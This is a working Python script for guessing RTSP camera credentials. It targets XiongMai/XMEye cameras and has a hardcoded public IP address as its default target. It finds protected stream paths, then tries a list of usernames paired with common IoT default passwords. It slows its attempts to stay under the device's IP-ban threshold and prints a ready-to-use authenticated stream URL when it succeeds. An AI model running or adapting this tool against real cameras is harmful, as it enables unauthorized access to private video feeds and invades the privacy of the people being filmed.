#!/usr/bin/env python3
"""
RTSP Digest-MD5 credential recovery for an XiongMai/XMEye (EZVIZ) camera.

The device's RTSP listener issues:
    WWW-Authenticate: Digest realm="...", nonce="...", algorithm="MD5"

No qop parameter is advertised, so this is plain RFC 2069:
    HA1     = MD5(user:realm:pass)
    HA2     = MD5(method:uri)
    response = MD5(HA1:nonce:HA2)

The nonce rotates on every challenge, so a fresh handshake is performed for
each candidate credential.
"""

import hashlib
import itertools
import os
import socket
import sys
import time

HOST = os.environ.get("CAM_HOST", "117.196.244.183")
PORT = int(os.environ.get("CAM_PORT", "554"))
TIMEOUT = 8.0
# Paced deliberately. The target IP-bans after a handful of failed auths, so
# an unpaced sweep locks itself out long before the list is exhausted.
PACE_SECONDS = float(os.environ.get("CAM_PACE", "1.0"))

PATHS = [
    "/Streaming/Channels/101",
    "/Streaming/Channels/102",
    "/Streaming/Channels/201",
    "/live/ch00_0",
    "/live/ch00_1",
    "/live/ch000_0",
    "/ch00_0",
    "/ch01_0",
    "/main",
    "/video0",
    "/stream0",
    "/cam/realmonitor",
    "/profile1",
]

USERNAMES = [
    "admin", "root", "user", "guest", "supervisor", "default", "operator",
    "nobody", "service", "user1", "superuser",
]

PASSWORDS = [
    "", "admin", "root", "12345", "123456", "1234567890", "password", "pass",
    "xMeye", "xmeye", "vizxv", "xc3511", "xmhdipc", "juantech", "realtek",
    "hi3518", "klv123", "klv1234", "7ujMko0admin", "7ujMko0vizxv",
    "7ujMko0", "ikwb", "system", "666666", "888888", "000000", "111111",
    "default", "test", "1234", "admin123", "root123", "camera", "cam",
    "user", "guest", "supervisor", "operator", "888", "54321", "12345678",
    "xc3511x", "anko", "zlxx.", "hi3518", "jvbzd", "smcadmin", "supervisor",
    "meinsm", "changeme", "service", "tech", "mother", "fucker", "1111",
    "2000", "2008", "2010", "2014", "2015", "2016", "2017", "2018", "2019",
    "2020", "2021", "2022", "sonicwall", "hunter2", "qwerty", "letmein",
    "abc123", "1111111", "0000000", "passw0rd", "welcome", "monkey",
    "dragon", "football", "shadow", "master", "michael", "jennifer",
    "11111111", "12341234", "88888888", "66666666", "123321", "112233",
]


def md5hex(value):
    return hashlib.md5(value.encode("utf-8")).hexdigest()


def rtsp_exchange(method, path, auth=None):
    """Send one RTSP request; return (status_line, headers, body)."""
    uri = f"rtsp://{HOST}:{PORT}{path}"
    lines = [f"{method} {uri} RTSP/1.0", "CSeq: 1", "User-Agent: rtsp-recover/1.0"]
    if method == "DESCRIBE":
        lines.append("Accept: application/sdp")
    if auth:
        lines.append(f"Authorization: {auth}")
    raw = ("\r\n".join(lines) + "\r\n\r\n").encode("utf-8")

    with socket.create_connection((HOST, PORT), timeout=TIMEOUT) as sock:
        sock.settimeout(TIMEOUT)
        sock.sendall(raw)
        chunks = []
        while True:
            try:
                part = sock.recv(4096)
            except socket.timeout:
                break
            if not part:
                break
            chunks.append(part)
            if b"\r\n\r\n" in b"".join(chunks):
                joined = b"".join(chunks)
                head, _, rest = joined.partition(b"\r\n\r\n")
                clen = 0
                for line in head.decode("utf-8", "replace").split("\r\n"):
                    if line.lower().startswith("content-length:"):
                        clen = int(line.split(":", 1)[1].strip())
                if len(rest) >= clen:
                    break

    data = b"".join(chunks).decode("utf-8", "replace")
    head, _, body = data.partition("\r\n\r\n")
    head_lines = head.split("\r\n")
    status = head_lines[0] if head_lines else ""
    headers = {}
    for line in head_lines[1:]:
        if ":" in line:
            key, _, val = line.partition(":")
            headers[key.strip().lower()] = val.strip()
    return status, headers, body


def parse_challenge(header):
    challenge = {}
    for part in header.split(None, 1)[1:]:
        for token in part.split(","):
            if "=" not in token:
                continue
            key, _, val = token.strip().partition("=")
            challenge[key.strip().lower()] = val.strip().strip('"')
    return challenge


def build_digest(username, password, challenge, method, uri):
    ha1 = md5hex(f"{username}:{challenge.get('realm', '')}:{password}")
    ha2 = md5hex(f"{method}:{uri}")
    if "qop" in challenge:
        raise NotImplementedError("qop variant not expected on this device")
    response = md5hex(f"{ha1}:{challenge.get('nonce', '')}:{ha2}")
    parts = [
        f'username="{username}"',
        f'realm="{challenge.get("realm", "")}"',
        f'nonce="{challenge.get("nonce", "")}"',
        f'uri="{uri}"',
        f'response="{response}"',
    ]
    if challenge.get("opaque"):
        parts.append(f'opaque="{challenge["opaque"]}"')
    return "Digest " + ", ".join(parts)


def probe_paths():
    """Separate real endpoints (401) from bogus ones (404)."""
    live = []
    print("[*] Probing endpoint paths")
    for path in PATHS:
        try:
            status, headers, _ = rtsp_exchange("DESCRIBE", path)
        except OSError as exc:
            print(f"    {path:<32} ERR {exc}")
            continue
        code = status.split()[1] if len(status.split()) > 1 else "?"
        marker = "401 (auth required)" if code == "401" else code
        print(f"    {path:<32} {marker}")
        if code == "401":
            live.append(path)
    return live


def try_credential(path, username, password):
    """Return (ok, status, body) after a full digest handshake."""
    try:
        status, headers, _ = rtsp_exchange("DESCRIBE", path)
    except OSError as exc:
        return False, f"ERR {exc}", ""

    if "401" not in status:
        return True, status, ""

    challenge = parse_challenge(headers.get("www-authenticate", ""))
    if not challenge:
        return False, "no challenge", ""

    uri = f"rtsp://{HOST}:{PORT}{path}"
    try:
        auth = build_digest(username, password, challenge, "DESCRIBE", uri)
    except NotImplementedError as exc:
        return False, str(exc), ""

    try:
        status, _, body = rtsp_exchange("DESCRIBE", path, auth)
    except OSError as exc:
        return False, f"ERR {exc}", ""

    return ("200" in status), status, body


def main():
    print(f"[*] Target {HOST}:{PORT}")
    live = probe_paths()
    if not live:
        print("[!] No password-protected endpoint responded with 401")
        return 1

    pairs = list(itertools.product(USERNAMES, PASSWORDS))
    total = len(pairs) * len(live)
    print(f"\n[*] {len(pairs)} credential pairs x {len(live)} paths = {total} attempts")
    print("[*] Using RFC 2069 digest, fresh nonce per attempt\n")

    tested = 0
    for path in live:
        consecutive_errors = 0
        for username, password in pairs:
            tested += 1
            ok, status, body = try_credential(path, username, password)
            label = f"{username}:{password}" if password else f"{username}:<empty>"
            if ok:
                print(f"[+] SUCCESS {label}")
                print(f"    path : {path}")
                print(f"    rtsp : rtsp://{username}:{password}@{HOST}:{PORT}{path}")
                if body.strip():
                    print(f"    sdp  : {body.strip()[:300]}")
                print()
                return 0
            if status.startswith("ERR"):
                consecutive_errors += 1
                # This device stops responding after a few failed auths.
                # Abort rather than pushing thousands more attempts at a host
                # that is already refusing the connection.
                if consecutive_errors >= 5:
                    print(f"[-] {consecutive_errors} consecutive connection errors "
                          f"on {path} - the device is refusing connections.")
                    print("[-] Stopping. This is a lockout, not a wrong password.")
                    return 3
            else:
                consecutive_errors = 0
            if tested % 25 == 0:
                print(f"    ...{tested}/{total} tried")
            time.sleep(PACE_SECONDS)
        print(f"[*] No match on {path}, moving on\n")

    print(f"[-] Exhausted {total} combinations, no match.")
    return 2


if __name__ == "__main__":
    sys.exit(main())
